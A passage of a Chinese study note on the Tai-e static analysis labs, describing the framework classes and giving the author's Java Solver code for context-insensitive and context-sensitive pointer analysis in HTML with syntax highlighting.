type="1"><li>CHA的不准确性<imgsrc="https://s2.loli.net/2023/09/23/eR8If2mDTEp3bjB.png"alt="image-20230923142616586" /></li><li>堆抽象</li><li>创建点抽象</li><li>何为<code>上下文敏感</code><imgsrc="https://s2.loli.net/2023/09/23/53AIlBp4xF1SiRt.png"alt="image-20230923151950665" /></li><li>何为<code>流敏感</code><imgsrc="https://s2.loli.net/2023/09/23/b5NtTi2wOgaul4L.png"alt="image-20230923153142011" /></li><li>指针分析处理的5种语句<imgsrc="https://s2.loli.net/2023/09/23/zQy4w7bst8LhTc1.png"alt="image-20230923161613082" /></li><li>符号<img src="https://s2.loli.net/2023/09/23/6CJo5SNaZ3nPTQ2.png"alt="image-20230923164447218" /></li><li>核心算法<imgsrc="https://s2.loli.net/2023/09/23/e9FOUXAdvQEPVSL.png"alt="image-20230923211746724" /></li></ol><h4 id="实现指针分析">实现指针分析</h4><ol type="1"><li><p>处理两种指针（<code>局部变量</code>和<code>实例字段</code>），为了使该指针分析更实用，将额外处理另两种指针（<code>静态字段</code>和<code>数组索引</code>）以及<code>静态方法调用</code>。</p></li><li><p>需要了解的<code>类</code></p><ol type="1"><li><p><code>pascal.taie.ir.stmt.DefinitionStmt</code></p><p>它表示程序中所有的定义语句，例如 <code>x = y</code> 和<code>x = m(…)</code>。在本lab中，所有影响指针的语句都是这个类的子类，</p></li><li><p><code>pascal.taie.ir.exp.Var</code></p><p>它表示 Tai-e IR 中的变量</p></li><li><p><code>pascal.taie.language.classes.JField</code></p><p>这个类表示程序中的各个字段。</p></li><li><p>指针分析相关的类</p><ol type="1"><li><p><code>pascal.taie.analysis.pta.core.heap.Obj</code></p><p>表示指针分析中的抽象对象</p></li><li><p><code>pascal.taie.analysis.pta.core.heap.HeapModel</code></p><p>表示堆模型（即堆抽象），它用来对堆对象进行建模</p></li><li><p><code>pascal.taie.analysis.pta.ci.PointsToSet</code></p><p>指针集，即指针分析中的 <code>Obj</code> 集合</p></li><li><p><code>pascal.taie.analysis.pta.ci.Pointer</code></p><p>表示分析中的指针，即 PFG（指针流图，pointer flowgrpah）中的节点</p></li><li><p><code>pascal.taie.analysis.pta.ci.PointerFlowGraph</code></p><p>表示程序的指针流图。它还维护着从变量、静态字段、实例字段、数组索引到相应指针（即PFG 节点）的映射，因此可以利用这个类的 API 获得各种指针</p></li><li><p><code>pascal.taie.analysis.pta.ci.WorkList</code></p><p>表示指针分析算法中的 worklist</p></li><li><p><code>pascal.taie.analysis.pta.ci.Solver</code></p><p>实现了一个上下文无关的指针分析求解器</p></li></ol></li></ol></li><li><p><code>Tai-e-assignments-wp/A5/Solver.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addReachable</span><span class="token punctuation">(</span><span class="token class-name">JMethod</span> method<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>callGraph<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        callGraph<span class="token punctuation">.</span><span class="token function">addReachableMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStmts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>stmt <span class="token operator">-></span> stmt<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>stmtProcessor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Processes statements in new reachable methods. */</span><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">StmtProcessor</span> <span class="token keyword">implements</span> <span class="token class-name">StmtVisitor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO check</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">New</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">PointsToSet</span><span class="token punctuation">(</span>heapModel<span class="token punctuation">.</span><span class="token function">getObj</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>                 <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addPFGEdge</span><span class="token punctuation">(</span><span class="token class-name">Pointer</span> source<span class="token punctuation">,</span> <span class="token class-name">Pointer</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>source<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Processes work-list entries until the work-list is empty. */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">analyze</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>workList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">WorkList<span class="token punctuation">.</span>Entry</span> entry <span class="token operator">=</span> workList<span class="token punctuation">.</span><span class="token function">pollEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Pointer</span> ptr <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">pointer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PointsToSet</span> delta <span class="token operator">=</span> <span class="token function">propagate</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">pointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token keyword">instanceof</span> <span class="token class-name">VarPtr</span> varPtr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Var</span> x <span class="token operator">=</span> varPtr<span class="token punctuation">.</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Obj</span> obj <span class="token operator">:</span> delta<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">StoreField</span> storeField <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getStoreFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>storeField<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getInstanceField</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>storeField<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">LoadField</span> loadField <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getLoadFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getInstanceField</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>loadField<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>loadField<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">StoreArray</span> storeArray <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getStoreArrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>storeArray<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getArrayIndex</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">LoadArray</span> loadArray <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getLoadArrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getArrayIndex</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">,</span>                            pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>loadArray<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">processCall</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Propagates pointsToSet to pt(pointer) and its PFG successors, * returns the difference set of pointsToSet and pt(pointer). */</span><span class="token keyword">private</span> <span class="token class-name">PointsToSet</span> <span class="token function">propagate</span><span class="token punctuation">(</span><span class="token class-name">Pointer</span> pointer<span class="token punctuation">,</span> <span class="token class-name">PointsToSet</span> pointsToSet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">PointsToSet</span> delta <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PointsToSet</span> has <span class="token operator">=</span> pointer<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       pointsToSet<span class="token punctuation">.</span><span class="token function">objects</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">filter</span><span class="token punctuation">(</span>ptr <span class="token operator">-></span> <span class="token operator">!</span>has<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">forEach</span><span class="token punctuation">(</span>ptr <span class="token operator">-></span> <span class="token punctuation">&#123;</span>has<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>delta<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>delta<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>succ <span class="token operator">-></span> workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>succ<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> delta<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Processes instance calls when points-to set of the receiver variable changes. * * @param var the variable that holds receiver objects * @param recv a new discovered object pointed by the variable. */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">processCall</span><span class="token punctuation">(</span><span class="token class-name">Var</span> <span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Obj</span> recv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Invoke</span> callSite <span class="token operator">:</span> <span class="token keyword">var</span><span class="token punctuation">.</span><span class="token function">getInvokes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JMethod</span> method <span class="token operator">=</span> <span class="token function">resolveCallee</span><span class="token punctuation">(</span>recv<span class="token punctuation">,</span> callSite<span class="token punctuation">)</span><span class="token punctuation">;</span>        workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getVarPtr</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">PointsToSet</span><span class="token punctuation">(</span>recv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>callGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">CallGraphs</span><span class="token punctuation">.</span><span class="token function">getCallKind</span><span class="token punctuation">(</span>callSite<span class="token punctuation">)</span><span class="token punctuation">,</span>callSite<span class="token punctuation">,</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">addReachable</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">pass</span><span class="token punctuation">(</span>callSite<span class="token punctuation">,</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="上下文敏感的指针分析">6. 上下文敏感的指针分析</h3><h4 id="须知">须知</h4><ol type="1"><li><p>在 Tai-e 上实现一个上下文敏感的 Java指针分析框架，其中程序调用图的构建是伴随着指针分析一同进行的。另外，还需要实现几种具体的上下文敏感策略。在实现正确的情况下，上下文敏感的指针分析构建的调用图将会比使用非上下文敏感的指针分析（CIPTA）构建的调用图更精确。此外，不同的上下文敏感策略会对精度产生不同的影响</p></li><li><p>这一算法处理两类指针（即局部变量和实例字段（instancefield））和实例方法的调用。为了实现一个更加实用的指针分析，需要额外处理两类指针（即静态字段（staticfield）和数组索引（array index））以及静态方法的调用。</p></li><li><p>需要了解的<code>类</code></p><ol type="1"><li><p><code>pascal.taie.analysis.pta.core.cs.context.Context</code></p><p>表示上下文敏感的指针分析中的上下文</p></li><li><p><code>pascal.taie.analysis.pta.core.cs.element.CSElement</code></p><p>该类表示指针分析中需要用到上下文的元素，每个这样的元素都和一个上下文相关联。它有四个子类，分别表示四种需要用到上下文的元素：<imgsrc="https://s2.loli.net/2023/09/23/Cm4YxSQHk2AhgDe.webp"alt="cselement-subclasses" /></p><ul><li><code>CSVar</code>：表示一个带上下文（<code>Context</code>）的变量（<code>Var</code>）。</li><li><code>CSObj</code>：表示一个带上下文（<code>Context</code>）的抽象对象（<code>Obj</code>）。</li><li><code>CSCallSite</code>：表示一个带上下文（<code>Context</code>）的调用点（<code>Invoke</code>）。</li><li><code>CSMethod</code>：表示一个带上下文（<code>Context</code>）的方法（<code>JMethod</code>）。</li></ul></li><li><p><code>pascal.taie.analysis.pta.core.cs.element.Pointer</code></p><p>该类表示上下文敏感指针分析中的指针，即 PFG（pointer flowgraph）中的节点</p></li><li><p><code>pascal.taie.analysis.pta.core.cs.element.CSManager</code></p><p>该类管理所有需要用到上下文的元素和所有上下文敏感的指针。也就是说，<code>CSElement</code>或 <code>Pointer</code>的所有子类的实例（每当你需要用到时）都需要通过这个类的相关 API来取得。</p></li><li><p><code>pascal.taie.analysis.pta.core.cs.selector.ContextSelector</code></p><p>该类是上下文敏感指针分析框架和具体的上下文敏感策略（如调用点敏感、对象敏感等）之间的接口</p></li><li><p><code>pascal.taie.analysis.pta.core.cs.CSCallGraph</code></p><p>表示上下文敏感的调用图</p></li><li><p><code>pascal.taie.analysis.pta.pts.PointsToSet</code></p><p>表示指针集（points-to sets），即上下文敏感指针分析中<code>CSObj</code> 的集合</p></li><li><p><code>pascal.taie.analysis.pta.pts.PointsToSetFactory</code></p><p>该类提供创建 <code>PointsToSet</code> 的静态工厂方法</p></li><li><p><code>pascal.taie.analysis.pta.cs.PointerFlowGraph</code></p><p>表示程序的指针流图 PFG</p></li><li><p><code>pascal.taie.analysis.pta.cs.WorkList</code></p><p>表示指针分析算法中的 WorkList。</p></li><li><p><code>pascal.taie.analysis.pta.cs.Solver</code></p><p>实现了一个上下文敏感的指针分析求解器</p></li></ol></li><li><p><code>Tai-e-assignments-wp/A6/Solver.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addReachable</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> csMethod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>callGraph<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        callGraph<span class="token punctuation">.</span><span class="token function">addReachableMethod</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>        csMethod<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStmts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>stmt <span class="token operator">-></span> stmt<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StmtProcessor</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">New</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Obj</span> obj <span class="token operator">=</span> heapModel<span class="token punctuation">.</span><span class="token function">getObj</span><span class="token punctuation">(</span>stmt       <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">New</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Obj</span> obj <span class="token operator">=</span> heapModel<span class="token punctuation">.</span><span class="token function">getObj</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CSObj</span> csObj <span class="token operator">=</span> csManager<span class="token punctuation">.</span><span class="token function">getCSObj</span><span class="token punctuation">(</span>contextSelector<span class="token punctuation">.</span><span class="token function">selectHeapContext</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>                csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token class-name">PointsToSetFactory</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>csObj<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">Copy</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">StoreField</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">JField</span> field <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                    csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    csManager<span class="token punctuation">.</span><span class="token function">getStaticField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">LoadField</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">JField</span> field <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                    csManager<span class="token punctuation">.</span><span class="token function">getStaticField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">,</span>                    csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token class-name">Invoke</span> stmt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">JMethod</span> method <span class="token operator">=</span> <span class="token function">resolveCallee</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> stmt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Context</span> context <span class="token operator">=</span> contextSelector<span class="token punctuation">.</span><span class="token function">selectContext</span><span class="token punctuation">(</span>csManager<span class="token punctuation">.</span><span class="token function">getCSCallSite</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">,</span> stmt<span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CSMethod</span> csMethod <span class="token operator">=</span> csManager<span class="token punctuation">.</span><span class="token function">getCSMethod</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>               callGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span>                    <span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">CallGraphs</span><span class="token punctuation">.</span><span class="token function">getCallKind</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">,</span>                            csManager<span class="token punctuation">.</span><span class="token function">getCSCallSite</span><span class="token punctuation">(</span><span class="token 